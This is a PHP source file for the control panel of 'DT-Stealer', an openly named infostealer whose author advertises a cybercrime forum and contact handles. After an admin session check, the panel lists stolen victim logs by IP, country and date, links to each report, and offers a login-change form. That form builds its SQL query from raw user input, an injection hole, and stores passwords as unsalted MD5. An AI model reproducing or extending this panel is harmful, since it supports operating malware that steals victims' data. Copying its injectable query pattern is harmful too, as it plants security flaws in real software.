<?php
session_start();
if(!$_SESSION['admin'])
{
	header("Location: login.php");
	exit;
}
require_once "include/db.php";

if (isset($_POST["adminForm"]))
{
	if (isset($_POST["login"]) && isset($_POST["password"]))
	{
		$login = $_POST['login'];
		$pass = md5($_POST['password']);

		$sql = "UPDATE admin SET login = '$login', password = '$pass'";
		$stmt = $db->prepare($sql);
		$stmt->execute();

		header("Location: index.php");
		exit;
	}
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>DT-Stealer</title>
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
	<link rel="stylesheet" href="css/main.css">
	<link rel="stylesheet" href="css/responsive.css">
</head>
<body>

	<header>
		<div class="container">
			<div class="header_content">
				<div class="logo_wrap">
					<a href="index.php" class="logo_link">DT-Stealer</a>
				</div>
				<div class="info_wrap">
					<small>by DeiTy | <a href="https://xss.is/" target="_blank">XSS.IS</a> | <a href="https://t.me/deity_dt_anime" target="_blank">My Telegram</a></small>
					<br>
					<small>My jabber: deity.developer@thesecure.biz</small>
				</div>
			</div>
		</div>
	</header>

	<section class="site_wrap">
		<div class="container bac-wrap">

			<ul class="nav nav-fill nav-tabs" id="myTab" role="tablist">
				<li class="nav-item">
					<a class="nav-link active" id="index-tab" data-toggle="tab" href="#index" role="tab" aria-controls="index" aria-selected="true">Index</a>
				</li>
				<li class="nav-item">
					<a class="nav-link" id="admin-tab" data-toggle="tab" href="#admin" role="tab" aria-controls="admin" aria-selected="false">Admin Setting</a>
				</li>
			</ul>

			<div class="tab-content" id="myTabContent">
				<div class="tab-pane fade show active" id="index" role="tabpanel" aria-labelledby="index-tab">
					<div class="table-responsive">
						<table class="table">
							<thead>
								<tr>
									<th scope="col">IP</th>
									<th scope="col">Country</th>
									<th scope="col">Date/Time</th>
									<th scope="col">Report</th>
								</tr>
							</thead>
							<tbody>
							<?php
							$sql = "SELECT * FROM logs";
							$result = $db->prepare($sql);
							$result->execute();
							if($result->rowCount() > 0){
							    while($res = $result->fetch(PDO::FETCH_BOTH)){
							    	echo '
									    <tr>
										<td>' , $res['ip'] , '</td>
										<td>' , $res['country'] , '</td>
										<td>' , $res['date'] , '</td>
										<td><a href="report.php?id=' , $res['id'] , '" class="open_report">Open</a></td>
										</tr>
							    	';
							    }
							}
							?>
							</tbody>
						</table>
					</div>
				</div>

				<div class="tab-pane fade" id="admin" role="tabpanel" aria-labelledby="admin-tab">
					<form action="index.php" method="POST" class="form_admin">
						<input type="text" class="form-control" name="login" placeholder="Login" required>
					    <input type="password" class="form-control" name="password" placeholder="Password" required>
					    <button name="adminForm" class="btn btn-lg btn-primary btn-block" type="submit">Save</button>
					</form>
				</div>
			</div>

		</div>
	</section>

	<footer>
		<span>(c)DT Stealer by DeiTy v0.1</span>
	</footer>
	<script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
	<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
	<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
</body>
</html>